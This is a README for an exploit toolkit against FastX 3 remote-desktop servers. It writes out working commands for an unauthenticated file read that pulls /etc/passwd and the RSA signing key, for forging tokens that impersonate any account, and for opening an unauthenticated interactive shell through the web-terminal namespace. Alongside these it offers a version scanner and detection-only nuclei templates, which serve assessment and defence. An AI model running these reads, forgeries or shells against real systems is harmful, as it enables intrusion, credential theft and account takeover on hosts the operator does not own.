# fastx32shell

Replay tooling for three FastX 3 issues. The file read and the token forgery it
enables are **CVE-2025-57618** (FastX 3 ≤ 3.3.69); the web-terminal command
execution is a separate issue, live through 3.1.27.

Read-only by default. Each tool runs one request (or one command) per invocation
and does not write to the target.

The per-version summary is under [Version notes](#version-notes).

| Tool | Issue | Default action |
|---|---|---|
| `fastx32shell read` | unauthenticated arbitrary file read via `/error/assets/:myfile` | reads one path |
| `fastx32shell forge` | API token forgery once the signing key is obtained | writes a token locally |
| `fastx32shell rce` | unauthenticated command execution via the `/gritty` Socket.IO namespace | runs `id` once, or an interactive shell |
| `fastx32shell scan` | none — decides from the build string alone | reports which issues a build carries |

Exit codes are shared across the tools, so a wrapper can branch on them:

| Code | Meaning |
|---|---|
| `0` | the tool did what it was asked |
| `1` | the surface answered but read nothing (`fastx32shell read`) |
| `2` | namespace reached but auth is enforced (`fastx32shell rce`) |
| `3` | surface absent or disabled (`fastx32shell rce`) |
| `4` | transport error, or accepted with no output (`fastx32shell rce`); every host was a transport error (`fastx32shell scan`) |
| `64` | usage error |

`fastx32shell scan` reuses `1`, `2` and `4` for its own meanings: `1` is "at least
one host was flagged", the reverse of `fastx32shell read`'s "the surface answered but
read nothing", `2` is "no input yielded a build string", and `4` is "every
host was a transport error". In every tool the
number means the interesting thing happened, which is the property a wrapper
should branch on.

## 1. Arbitrary file read (CVE-2025-57618)

`/error/assets/:myfile` resolves the route parameter against the asset directory
with no validation, so any path the process can read is returned to a client that
never authenticates.

**Scope.** Vulnerable from 3.0.32 through 3.3.69; fixed in **3.3.71** by a
hardcoded filename allowlist. NVD's "thru 3.3.67" understates the range: 3.3.69
has no allowlist.

```sh
# does the route read files at all?
fastx32shell read --base https://fastx.example.com --check

# read specific paths
fastx32shell read --base https://fastx.example.com \
                --file /etc/passwd --file /etc/hostname --outdir ./loot

# pick a form explicitly (see below)
fastx32shell read --base https://fastx.example.com \
                --form relative --depth 9 --file /etc/passwd
```

Two request forms are supported because deployments differ:

- **absolute** — `/error/assets/%2fetc%2fpasswd`. The leading slash is
  percent-encoded, so the parameter is an absolute path and the asset prefix is
  discarded. Contains no dot segments, so reverse proxies that normalise or
  reject `../` do not interfere.
- **relative** — `/error/assets/..%2f..%2f..%2fetc%2fpasswd`. Depends on the
  install layout for its depth and can be answered with `400` by a front end
  before the request reaches the application.

`--form auto` (the default) tries absolute, then relative at depths 9–12, and
stops at the first form that returns a body. A `200` with an empty body is the
handler's "not found" path — it is not a successful read, and the tool will not
report it as one. The 3.3.71 allowlist also rejects by returning an empty `200`,
so a patched instance is indistinguishable from an absent route by status alone;
the empty-body check is what keeps the tool from reporting a patched server as
vulnerable. In practice the **absolute** form is the one that works — it carries
no dot segments, so this is CWE-36 (absolute path traversal), not the CWE-24
(`../`) the CVE records.

## 2. Token forgery (second half of CVE-2025-57618)

The file read above returns the RSA signing key from the config directory; this
is the step that turns disclosure into impersonation. Given the signing key and
the issuer value from the target, any account on the host can be impersonated:

```sh
fastx32shell forge -k private.pem -s serverId.txt -u someuser -o /tmp/tok.jwt
```

The token is written `0600` and is not echoed unless you pass `-p`. The tool
refuses to write into a directory whose path contains `evidence`, `findings` or
`poc`, so a bearer token does not end up in collected output.

```
x-fastx-token: <jwt>      or      Cookie: fx3-token=<jwt>
```

## 3. Unauthenticated command execution

Affected builds expose a web terminal over a Socket.IO namespace with no `auth`
callback. The library treats a missing auth handler as "admit everyone", and its
`terminal` event handler prefers the client's command over the configured one:

```js
gritty.listen(socket, { autoRestart: true });   // no auth option

// later, in the library's connection handler:
const command = overrides.command || options.command || getCMD({platform});
pty.spawn(...stringArgv(command), { cwd, env: {...process.env, ...env} });
```

The configured login script is never reached, and the child runs as the account
that owns the FastX service.

**Version scope — read this before pointing the tool at anything.**

| Builds | Result | Why |
|---|---|---|
| 3.0.41 – 3.1.27 | **exploitable** | terminal in `www/server`, `io.listen(app.server)` binds the namespace to the public web port, no `auth` option |
| 3.2.27 – 3.3.71 | not exploitable | terminal moved to the loopback-only `user-link` process; `socketIo()` is handed an `undefined` server and mounts nothing; `gritty` module not shipped |
| 3.0.32 and earlier | not present | no terminal in the build at all |
| FastX 4 / 5 | not present | subsystem removed |

The FastX service account is in the **root group**. Against 3.2.27+
`--base https://host:3300` is the wrong target shape anyway: the namespace isn't on the public port, so exit `3` there is
correct, not a tool failure.

This range was broken by accident, not fixed: `socketIo(app.server)` where
`app.server` is undefined is a latent bug, and a maintainer repairing the broken
terminal without adding an `auth` option would **reintroduce the RCE**.

```sh
# does the namespace admit an unauthenticated client?
fastx32shell rce --base https://fastx.example.com --dry-run

# run one command
fastx32shell rce --base https://fastx.example.com --cmd 'id'

# keep a shell open and use it
fastx32shell rce --base https://fastx.example.com -i
printf 'id; ls /tmp\n' | fastx32shell rce --base https://fastx.example.com -i
```

The command string is split into argv by the target, so shell metacharacters are
passed literally rather than interpreted. If you need a shell, ask for one
explicitly — which is what `-i` does: it sends one `terminal` event naming
`--cmd` (default `bash`) and then forwards each typed line as a `data` event,
printing pty output as it arrives. Because the pty stays alive, `cd`, variables
and pipes behave normally across lines; a one-shot `--cmd` starts from scratch
every run.

`-i` is line mode: a line is sent on Enter, and there is no tab completion or
history recall. The pty echoes each line back, so a local terminal (which has
already shown you typing it) would see it twice; that echo is stripped when
stdin is a tty. With piped stdin nothing is stripped, so the output reads like a
script transcript: command, echo, result. A line typed at a password or
passphrase prompt is not displayed at all: the prompt text is recognised as it
arrives, local echo is muted, and it comes back the moment the line is sent, so
`sudo`, `su`, `passwd` and `ssh` passphrase prompts behave as they do in a local
shell. Detection reads the prompt, so an unrecognised wording falls back to the
behaviour above — the secret reaches the target either way, only the display
differs. Ctrl-C interrupts the remote command
rather than the tool, and Ctrl-D (or EOF) sends `\x04` and waits for the pty to
die before disconnecting, so the last command's output is not cut off by the
disconnect killing the pty. A completed session exits `0` regardless of the
shell's own exit status; that status is printed.

## 4. Version scan

`fastx32shell scan` answers "which of these hosts is running an affected
build" from the build string alone. It makes one request — `GET /v3/api/`, whose
JSON carries `result.build` — and sends nothing else: no traversal, no namespace,
no credential. `--build` and `--build-file` classify strings you already have
(Nessus, nmap, a spreadsheet) with no network at all.

It is the only tool here that can tell 3.1.27 from 3.2.27, and the only one that
can distinguish *fixed* from *absent*: `fastx32shell read` reports `NO READ` against
3.3.71 because the allowlist answers an empty `200`, while the build string names
the version outright.

```sh
fastx32shell scan --base https://fastx.example.com:3300
fastx32shell scan --base-file scope.txt --json
fastx32shell scan --build 3.1.27
```

```
https://hub.example.com:3300   3.3.69  read:vulnerable (confirmed)
https://lab.example.com:3300   3.1.27  read:vulnerable (confirmed)   rce:vulnerable (confirmed)
https://new.example.com:3300   3.3.71  clean (nothing known at this build)
https://old.example.com:3300   3.2.10  read:vulnerable (inferred)    rce:unknown (not sampled)
https://nope.example.com:3300  -       no version (http 401)
5 hosts: 3 flagged, 1 clean, 0 unknown, 1 no version
```

Every verdict carries its basis. `confirmed` means that exact build was
inspected; `inferred` means it sits inside a range whose ends were both
inspected; `unknown` means nobody has looked. The command execution stops
somewhere between 3.1.27 and 3.2.27 and nothing in between was sampled, so a
build in there is reported as a gap rather than a guess — as is 3.3.70, which
sits between a vulnerable 3.3.69 and the allowlisted 3.3.71. A FastX 4 build in
the CVE-2025-57563 range is flagged `unverified`: that range is public, but 4.x
was not examined.

A version answer is the target's own claim, and it does not confirm
exploitability — `fastx32shell read --check` and `fastx32shell rce --dry-run`
are what confirm that. It is the right first question to ask of a scope list: one
cheap request, and a host that will not answer at all is reported as such rather
than being counted clean.

## 5. Offline tests

The suite under `tests/` runs each tool against in-process mock servers; no
target is needed. It needs `openssl` (OpenSSL 3, not LibreSSL) on `PATH` to
generate test keys; the toolkit itself does not.

```sh
uv run python -m unittest discover tests
```

## 6. Nuclei templates

`nuclei/` holds four templates for sweeping a scope list with
[nuclei](https://github.com/projectdiscovery/nuclei) instead of the toolkit.
They are separate artifacts: the toolkit does not call nuclei, and the offline
suite does not need it.

| Template | Severity | Equivalent |
|---|---|---|
| `fastx3-error-assets-file-read.yaml` | high | `fastx32shell read --check` |
| `fastx3-gritty-unauth-rce.yaml` | critical | `fastx32shell rce --dry-run` |
| `gritty-unauth-terminal.yaml` | critical | none; any gritty on socket.io 4 |
| `fastx3-version-detect.yaml` | info | `fastx32shell scan` (reports the build only) |

```sh
nuclei -t nuclei/ -u https://fastx.example.com:3300
nuclei -t nuclei/ -l scope.txt
```

The file-read template requests `/etc/passwd` in the absolute form, then the
relative form at depths 9-12, and matches only on passwd content in the body. A
status check alone would flag a patched 3.3.71, whose allowlist answers `200`
with an empty body.

The RCE template is detection only. It completes the Engine.IO v3 handshake,
joins `/gritty`, and matches on the server's `accept` event; it never sends a
`terminal` event, so nothing runs on the target. A namespace with an auth
handler joins but never accepts, and is not reported.

The FastX template speaks Engine.IO v3 only, and a socket.io 4 server refuses
that handshake, so it cannot see current gritty. `gritty-unauth-terminal.yaml`
covers that case: gritty's own CLI, which never passes an `auth` callback, and
Cloud Commander started with `--terminal` but without `--auth`, whose callback
accepts any credentials while auth is off. It sends an `auth` event with empty
credentials before polling, which an enforcing server rejects, and like the
FastX template it stops at `accept`. For an install under a URL prefix, scan
the prefixed URL.

The version-detect template reads the build string from `GET /v3/api/` and
reports it, the same source `fastx32shell scan` reads. It does not classify
the build or decide whether it is vulnerable, and sends no exploiting request;
it is a fingerprint for narrowing a scope list before the other templates run.

## Version notes

Confirm the build string on the target (`GET /v3/api/` returns `result.build`),
then compare it against this summary:

| Build | File read | Terminal RCE |
|---|---|---|
| ≤ 3.0.32 | yes (from 3.0.32) | no — no terminal |
| 3.0.41 – 3.1.27 | yes | **yes** |
| 3.2.27 – 3.3.69 | yes | no — namespace never mounts |
| 3.3.71 | no — allowlist | no |
| FastX 4 / 5 | not examined / n/a | no — subsystem removed |

A negative only means "not present here" when the server is actually up: an
empty `200` from `fastx32shell read`, or exit `3` from `fastx32shell rce`,
against a server that failed to start is a false negative, not a clean result.

## Requirements

Python 3.9+ and nothing else. No third-party packages, and no external
binaries: the RS256 signing that `fastx32shell forge` needs is done in the standard
library.

    uv run fastx32shell scan --build 3.1.27      # from a checkout
    uv tool install .                            # fastx32shell on PATH

